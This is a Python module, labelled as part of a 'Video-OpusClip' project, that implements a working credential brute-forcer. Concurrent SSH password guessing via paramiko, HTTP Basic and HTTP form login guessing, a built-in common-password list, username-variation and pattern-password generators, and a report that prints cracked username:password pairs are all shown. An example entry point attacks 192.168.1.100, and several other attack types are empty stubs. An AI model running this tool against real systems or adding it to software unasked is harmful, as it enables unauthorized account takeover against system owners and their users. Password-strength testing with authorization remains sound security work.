#!/usr/bin/env python3
"""
Brute Forcers Module for Video-OpusClip
Password and credential brute forcing tools
"""

import asyncio
import aiohttp
import paramiko
import socket
import subprocess
import hashlib
import time
from typing import Dict, List, Any, Optional, Union, Tuple, Callable
from dataclasses import dataclass
from enum import Enum
from datetime import datetime
import itertools
import string
import re

class AttackType(str, Enum):
    """Types of brute force attacks"""
    SSH_PASSWORD = "ssh_password"
    SSH_KEY = "ssh_key"
    HTTP_BASIC = "http_basic"
    HTTP_FORM = "http_form"
    FTP = "ftp"
    SMTP = "smtp"
    DATABASE = "database"
    CUSTOM = "custom"

class AttackStatus(str, Enum):
    """Attack status enumeration"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    COMPLETED = "completed"
    CANCELLED = "cancelled"

@dataclass
class Credential:
    """Credential information"""
    username: str
    password: str
    service: str
    target: str
    discovered_at: datetime = None
    
    def __post_init__(self):
        if self.discovered_at is None:
            self.discovered_at = datetime.utcnow()

@dataclass
class AttackResult:
    """Attack result information"""
    attack_type: AttackType
    target: str
    status: AttackStatus
    credentials_found: List[Credential]
    attempts_made: int
    total_combinations: int
    start_time: datetime
    end_time: Optional[datetime] = None
    error_message: Optional[str] = None
    
    def __post_init__(self):
        if self.start_time is None:
            self.start_time = datetime.utcnow()

@dataclass
class BruteForceConfig:
    """Configuration for brute force attacks"""
    target: str
    port: int
    attack_type: AttackType
    usernames: List[str]
    passwords: List[str]
    max_concurrent: int = 10
    timeout: float = 30.0
    delay: float = 0.1
    max_attempts: Optional[int] = None
    stop_on_success: bool = True
    custom_headers: Dict[str, str] = None
    form_data: Dict[str, str] = None
    success_pattern: Optional[str] = None
    failure_pattern: Optional[str] = None
    
    def __post_init__(self):
        if self.custom_headers is None:
            self.custom_headers = {}
        if self.form_data is None:
            self.form_data = {}

class BruteForcer:
    """Base brute forcer class"""
    
    def __init__(self, config: BruteForceConfig):
        self.config = config
        self.results: List[AttackResult] = []
        self.current_attack: Optional[AttackResult] = None
        self.is_running = False
        self.should_stop = False
    
    async def start_attack(self) -> AttackResult:
        """Start brute force attack"""
        if self.is_running:
            raise RuntimeError("Attack already running")
        
        self.is_running = True
        self.should_stop = False
        
        # Create attack result
        self.current_attack = AttackResult(
            attack_type=self.config.attack_type,
            target=self.config.target,
            status=AttackStatus.RUNNING,
            credentials_found=[],
            attempts_made=0,
            total_combinations=len(self.config.usernames) * len(self.config.passwords),
            start_time=datetime.utcnow()
        )
        
        try:
            # Execute attack based on type
            if self.config.attack_type == AttackType.SSH_PASSWORD:
                await self._ssh_password_attack()
            elif self.config.attack_type == AttackType.SSH_KEY:
                await self._ssh_key_attack()
            elif self.config.attack_type == AttackType.HTTP_BASIC:
                await self._http_basic_attack()
            elif self.config.attack_type == AttackType.HTTP_FORM:
                await self._http_form_attack()
            elif self.config.attack_type == AttackType.FTP:
                await self._ftp_attack()
            elif self.config.attack_type == AttackType.SMTP:
                await self._smtp_attack()
            elif self.config.attack_type == AttackType.DATABASE:
                await self._database_attack()
            elif self.config.attack_type == AttackType.CUSTOM:
                await self._custom_attack()
            
            # Mark as completed
            self.current_attack.status = AttackStatus.COMPLETED
            self.current_attack.end_time = datetime.utcnow()
            
        except Exception as e:
            self.current_attack.status = AttackStatus.FAILED
            self.current_attack.error_message = str(e)
            self.current_attack.end_time = datetime.utcnow()
        
        finally:
            self.is_running = False
            self.results.append(self.current_attack)
            return self.current_attack
    
    def stop_attack(self) -> None:
        """Stop current attack"""
        self.should_stop = True
    
    async def _ssh_password_attack(self) -> None:
        """SSH password brute force attack"""
        semaphore = asyncio.Semaphore(self.config.max_concurrent)
        
        tasks = []
        for username in self.config.usernames:
            for password in self.config.passwords:
                if self.should_stop:
                    break
                tasks.append(self._test_ssh_credentials(username, password, semaphore))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, dict) and result.get("success"):
                credential = Credential(
                    username=result["username"],
                    password=result["password"],
                    service="ssh",
                    target=self.config.target
                )
                self.current_attack.credentials_found.append(credential)
                
                if self.config.stop_on_success:
                    self.should_stop = True
                    break
    
    async def _test_ssh_credentials(self, username: str, password: str, semaphore: asyncio.Semaphore) -> Dict[str, Any]:
        """Test SSH credentials"""
        async with semaphore:
            try:
                # Create SSH client
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Try to connect
                client.connect(
                    self.config.target,
                    port=self.config.port,
                    username=username,
                    password=password,
                    timeout=self.config.timeout,
                    banner_timeout=self.config.timeout,
                    auth_timeout=self.config.timeout
                )
                
                # If we get here, authentication was successful
                client.close()
                
                self.current_attack.attempts_made += 1
                
                return {
                    "success": True,
                    "username": username,
                    "password": password,
                    "description": "SSH authentication successful"
                }
                
            except paramiko.AuthenticationException:
                self.current_attack.attempts_made += 1
                return {
                    "success": False,
                    "username": username,
                    "password": password,
                    "description": "SSH authentication failed"
                }
            except Exception as e:
                self.current_attack.attempts_made += 1
                return {
                    "success": False,
                    "username": username,
                    "password": password,
                    "error": str(e)
                }
            finally:
                # Add delay between attempts
                await asyncio.sleep(self.config.delay)
    
    async def _ssh_key_attack(self) -> None:
        """SSH key brute force attack"""
        # This would test different private keys against known usernames
        # Implementation would depend on available key files
        pass
    
    async def _http_basic_attack(self) -> None:
        """HTTP Basic Authentication brute force attack"""
        semaphore = asyncio.Semaphore(self.config.max_concurrent)
        
        tasks = []
        for username in self.config.usernames:
            for password in self.config.passwords:
                if self.should_stop:
                    break
                tasks.append(self._test_http_basic_credentials(username, password, semaphore))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, dict) and result.get("success"):
                credential = Credential(
                    username=result["username"],
                    password=result["password"],
                    service="http_basic",
                    target=self.config.target
                )
                self.current_attack.credentials_found.append(credential)
                
                if self.config.stop_on_success:
                    self.should_stop = True
                    break
    
    async def _test_http_basic_credentials(self, username: str, password: str, semaphore: asyncio.Semaphore) -> Dict[str, Any]:
        """Test HTTP Basic Authentication credentials"""
        async with semaphore:
            try:
                import base64
                
                # Create basic auth header
                auth_string = f"{username}:{password}"
                auth_header = base64.b64encode(auth_string.encode()).decode()
                
                headers = {
                    "Authorization": f"Basic {auth_header}",
                    **self.config.custom_headers
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        f"http://{self.config.target}:{self.config.port}",
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=self.config.timeout)
                    ) as response:
                        self.current_attack.attempts_made += 1
                        
                        if response.status == 200:
                            return {
                                "success": True,
                                "username": username,
                                "password": password,
                                "description": "HTTP Basic authentication successful"
                            }
                        else:
                            return {
                                "success": False,
                                "username": username,
                                "password": password,
                                "description": f"HTTP Basic authentication failed (status: {response.status})"
                            }
                            
            except Exception as e:
                self.current_attack.attempts_made += 1
                return {
                    "success": False,
                    "username": username,
                    "password": password,
                    "error": str(e)
                }
            finally:
                await asyncio.sleep(self.config.delay)
    
    async def _http_form_attack(self) -> None:
        """HTTP Form Authentication brute force attack"""
        semaphore = asyncio.Semaphore(self.config.max_concurrent)
        
        tasks = []
        for username in self.config.usernames:
            for password in self.config.passwords:
                if self.should_stop:
                    break
                tasks.append(self._test_http_form_credentials(username, password, semaphore))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, dict) and result.get("success"):
                credential = Credential(
                    username=result["username"],
                    password=result["password"],
                    service="http_form",
                    target=self.config.target
                )
                self.current_attack.credentials_found.append(credential)
                
                if self.config.stop_on_success:
                    self.should_stop = True
                    break
    
    async def _test_http_form_credentials(self, username: str, password: str, semaphore: asyncio.Semaphore) -> Dict[str, Any]:
        """Test HTTP Form Authentication credentials"""
        async with semaphore:
            try:
                # Prepare form data
                form_data = self.config.form_data.copy()
                form_data.update({
                    "username": username,
                    "password": password
                })
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        f"http://{self.config.target}:{self.config.port}",
                        data=form_data,
                        headers=self.config.custom_headers,
                        timeout=aiohttp.ClientTimeout(total=self.config.timeout)
                    ) as response:
                        content = await response.text()
                        self.current_attack.attempts_made += 1
                        
                        # Check for success/failure patterns
                        success = False
                        if self.config.success_pattern and re.search(self.config.success_pattern, content):
                            success = True
                        elif self.config.failure_pattern and not re.search(self.config.failure_pattern, content):
                            success = True
                        elif response.status == 200 and "error" not in content.lower():
                            success = True
                        
                        if success:
                            return {
                                "success": True,
                                "username": username,
                                "password": password,
                                "description": "HTTP Form authentication successful"
                            }
                        else:
                            return {
                                "success": False,
                                "username": username,
                                "password": password,
                                "description": "HTTP Form authentication failed"
                            }
                            
            except Exception as e:
                self.current_attack.attempts_made += 1
                return {
                    "success": False,
                    "username": username,
                    "password": password,
                    "error": str(e)
                }
            finally:
                await asyncio.sleep(self.config.delay)
    
    async def _ftp_attack(self) -> None:
        """FTP brute force attack"""
        # FTP attack implementation would use ftplib
        pass
    
    async def _smtp_attack(self) -> None:
        """SMTP brute force attack"""
        # SMTP attack implementation would use smtplib
        pass
    
    async def _database_attack(self) -> None:
        """Database brute force attack"""
        # Database attack implementation would depend on database type
        pass
    
    async def _custom_attack(self) -> None:
        """Custom brute force attack"""
        # Custom attack implementation
        pass

class PasswordGenerator:
    """Password generation utilities"""
    
    @staticmethod
    def generate_common_passwords() -> List[str]:
        """Generate list of common passwords"""
        return [
            "", "password", "123456", "123456789", "qwerty", "abc123",
            "password123", "admin", "admin123", "root", "root123",
            "user", "user123", "guest", "guest123", "test", "test123",
            "demo", "demo123", "welcome", "welcome123", "login", "login123",
            "pass", "pass123", "secret", "secret123", "private", "private123",
            "letmein", "letmein123", "changeme", "changeme123", "newpass", "newpass123"
        ]
    
    @staticmethod
    def generate_username_variations(base_username: str) -> List[str]:
        """Generate username variations"""
        variations = [base_username]
        
        # Add common suffixes
        suffixes = ["1", "2", "3", "123", "admin", "user", "test"]
        for suffix in suffixes:
            variations.append(f"{base_username}{suffix}")
        
        # Add common prefixes
        prefixes = ["admin", "user", "test", "dev"]
        for prefix in prefixes:
            variations.append(f"{prefix}{base_username}")
        
        return variations
    
    @staticmethod
    def generate_pattern_passwords(pattern: str, length: int = 8) -> List[str]:
        """Generate passwords based on pattern"""
        passwords = []
        
        if pattern == "numeric":
            # Numeric passwords
            for i in range(1, min(length + 1, 10)):
                passwords.extend([''.join(p) for p in itertools.product(string.digits, repeat=i)])
        
        elif pattern == "alpha":
            # Alphabetic passwords
            for i in range(1, min(length + 1, 10)):
                passwords.extend([''.join(p) for p in itertools.product(string.ascii_lowercase, repeat=i)])
        
        elif pattern == "alphanumeric":
            # Alphanumeric passwords
            for i in range(1, min(length + 1, 8)):
                passwords.extend([''.join(p) for p in itertools.product(string.ascii_letters + string.digits, repeat=i)])
        
        return passwords[:1000]  # Limit to prevent memory issues

class BruteForceManager:
    """Manager for multiple brute force attacks"""
    
    def __init__(self):
        self.attackers: List[BruteForcer] = []
        self.results: List[AttackResult] = []
    
    def add_attack(self, config: BruteForceConfig) -> BruteForcer:
        """Add a new attack configuration"""
        attacker = BruteForcer(config)
        self.attackers.append(attacker)
        return attacker
    
    async def run_all_attacks(self) -> List[AttackResult]:
        """Run all configured attacks"""
        tasks = [attacker.start_attack() for attacker in self.attackers]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, AttackResult):
                self.results.append(result)
        
        return self.results
    
    def stop_all_attacks(self) -> None:
        """Stop all running attacks"""
        for attacker in self.attackers:
            attacker.stop_attack()
    
    def get_successful_credentials(self) -> List[Credential]:
        """Get all successful credentials from all attacks"""
        credentials = []
        for result in self.results:
            if result.status == AttackStatus.COMPLETED:
                credentials.extend(result.credentials_found)
        return credentials
    
    def generate_report(self) -> str:
        """Generate comprehensive brute force report"""
        report = "🔓 BRUTE FORCE ATTACK REPORT\n"
        report += "=" * 50 + "\n\n"
        
        total_attacks = len(self.results)
        successful_attacks = len([r for r in self.results if r.credentials_found])
        total_credentials = len(self.get_successful_credentials())
        
        report += f"Total Attacks: {total_attacks}\n"
        report += f"Successful Attacks: {successful_attacks}\n"
        report += f"Total Credentials Found: {total_credentials}\n\n"
        
        # Attack details
        for i, result in enumerate(self.results, 1):
            report += f"Attack {i}: {result.attack_type.value}\n"
            report += f"Target: {result.target}\n"
            report += f"Status: {result.status.value}\n"
            report += f"Attempts: {result.attempts_made}/{result.total_combinations}\n"
            
            if result.start_time and result.end_time:
                duration = (result.end_time - result.start_time).total_seconds()
                report += f"Duration: {duration:.2f} seconds\n"
            
            if result.credentials_found:
                report += "Credentials Found:\n"
                for cred in result.credentials_found:
                    report += f"  • {cred.username}:{cred.password} ({cred.service})\n"
            
            if result.error_message:
                report += f"Error: {result.error_message}\n"
            
            report += "\n"
        
        return report

# Example usage
async def main():
    """Example usage of brute forcers"""
    print("🔓 Brute Force Attack Example")
    
    # Create password generator
    password_gen = PasswordGenerator()
    common_passwords = password_gen.generate_common_passwords()
    username_variations = password_gen.generate_username_variations("admin")
    
    # Create brute force manager
    manager = BruteForceManager()
    
    # SSH attack
    ssh_config = BruteForceConfig(
        target="192.168.1.100",
        port=22,
        attack_type=AttackType.SSH_PASSWORD,
        usernames=username_variations,
        passwords=common_passwords[:10],  # Limit for demo
        max_concurrent=5,
        timeout=10.0,
        delay=0.5,
        stop_on_success=True
    )
    manager.add_attack(ssh_config)
    
    # HTTP Basic attack
    http_config = BruteForceConfig(
        target="192.168.1.100",
        port=80,
        attack_type=AttackType.HTTP_BASIC,
        usernames=["admin", "user", "guest"],
        passwords=common_passwords[:5],  # Limit for demo
        max_concurrent=3,
        timeout=10.0,
        delay=0.2
    )
    manager.add_attack(http_config)
    
    # Run attacks
    print("Starting brute force attacks...")
    results = await manager.run_all_attacks()
    
    # Generate report
    print("\n📋 Brute Force Report:")
    print(manager.generate_report())
    
    # Show successful credentials
    successful_creds = manager.get_successful_credentials()
    if successful_creds:
        print("\n🔓 Successful Credentials:")
        for cred in successful_creds:
            print(f"  {cred.username}:{cred.password} ({cred.service})")
    else:
        print("\n❌ No successful credentials found")

if __name__ == "__main__":
    asyncio.run(main()) 